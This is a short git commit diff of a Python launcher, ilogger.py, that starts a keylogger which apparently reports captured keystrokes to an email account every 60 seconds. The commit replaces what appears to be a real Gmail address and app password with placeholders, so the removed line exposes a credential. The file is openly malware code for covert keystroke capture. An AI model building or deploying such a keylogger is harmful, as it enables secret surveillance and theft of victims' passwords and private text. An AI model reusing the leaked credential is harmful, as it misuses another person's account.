07089c0bce023d8cb055fd082aa994f4193225e7
isha1701 <52813797+isha1701@users.noreply.github.com>
2023-02-01 00:04:29 +0530

    Update ilogger.py

--- ilogger.py
+++ ilogger.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python
 import keylogger
 
-my_keylogger = keylogger.Keylogger(60, "hackersamwinchester@gmail.com", "xxsqobtwbxbmakvz")
+my_keylogger = keylogger.Keylogger(60, "youremailid@gmail.com", "password")
 my_keylogger.start()
